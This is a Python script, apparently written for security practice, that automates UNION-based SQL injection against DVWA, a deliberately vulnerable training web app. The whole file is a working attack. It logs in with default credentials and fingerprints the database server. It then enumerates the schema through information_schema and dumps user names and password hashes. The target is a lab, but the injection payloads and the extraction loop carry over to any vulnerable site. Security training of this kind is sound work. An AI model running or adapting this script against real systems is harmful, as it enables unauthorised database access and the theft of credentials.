'''
File: dvwa_blind_sqli.py
Author: Gabriel "solstice" Ryan
Email: gabriel@solstice.me
Description:

Reconstructs database schema and dumps hashes for DVWA by exploiting blind SQLi.

'''
import json
import mechanize
import cookielib
from bs4 import BeautifulSoup

TARGET = 'http://192.168.1.170/dvwa'
SQLI_PAGE = '%s/%s' % (TARGET, 'vulnerabilities/sqli_blind/')

SCHEMA_QUERY = '-1 UNION SELECT ALL table_name, column_name FROM information_schema.columns WHERE table_schema LIKE 0x64767761 LIMIT 1 OFFSET %d;#'

USER_QUERY = '-1 UNION SELECT ALL user,password FROM users LIMIT 1 OFFSET %d;# '

def initialize_browser():

    # Browser
    br = mechanize.Browser()
    
    # Cookie Jar
    cj = cookielib.LWPCookieJar()
    br.set_cookiejar(cj)
    
    # Browser options
    br.set_handle_equiv(True)
    br.set_handle_gzip(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    
    # Follows refresh 0 but not hangs on refresh > 0
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    
    # Want debugging messages?
    #br.set_debug_http(True)
    #br.set_debug_redirects(True)
    #br.set_debug_responses(True)
    
    # User-Agent (this is cheating, ok?)
    br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

    return br

def dvwa_login():

    # login to dvwa
    response = browser.open(TARGET)
    html = response.read()
    browser.select_form(nr=0)
    browser.form['username'] = 'admin'
    browser.form['password'] = 'admin'
    response = browser.submit()
    html = response.read()

def set_security_level(level):
    browser.set_cookie('security=medium')

def pprint(string):

    print json.dumps(string, indent=4, sort_keys=True)

def make_query(query):
    
    # submit query to form
    response = browser.open(SQLI_PAGE)
    html = response.read()
    browser.select_form(nr=0)
    browser.form['id'] = query
    response = browser.submit()
    html = response.read()


    # parse and return  results
    soup = BeautifulSoup(html)
    pre_tags =  soup.select('pre')
    if len(pre_tags) == 0:
        return None

    first_split = pre_tags[0].text.split('Surname: ')


    return {

        '1' : first_split[0].split('First name: ')[1],
        '2' : first_split[1],
    }

if __name__ == '__main__':

    # setup
    browser = initialize_browser()
    dvwa_login()
    set_security_level('medium')
    database = { 'creds' : []}

    # LAYER 1 - DATABASE FINGERPRINTING

    # get hostname and version string
    result = make_query('-1 UNION SELECT ALL @@version, @@hostname;#')
    database['hostname'] = result['2']
    database['version'] = result['1']

    # get user and datadir
    result = make_query('-1 UNION SELECT ALL user(), @@datadir;#')
    database['user'] = result['1']
    database['datadir'] = result['2']

    # get database name
    result = make_query('-1 UNION SELECT ALL database(), 2;#')
    database['schema'] = result['1']

    # LAYER 2 - DATABASE SCHEMA

    database['tables'] = {}

    i = 0
    result = make_query(SCHEMA_QUERY % i)
    while result is not None:

        table_name = result['1']
        column_name = result['2']

        if table_name in database['tables']:
            database['tables'][table_name]['columns'].append(column_name)
        else:
            database['tables'][table_name] = {
                'name' : table_name,
                'schema' : database['schema'],
                'columns' : [ column_name ],
            }

        i += 1
        result = make_query(SCHEMA_QUERY % i)

    i = 0
    result = make_query(USER_QUERY % i)
    while result is not None:

        database['creds'].append({
            'user' : result['1'],
            'password' : result['2'],
        })

        i += 1
        result = make_query(USER_QUERY % i)

    pprint(database)

    for c in database['creds']:
        print c['password']
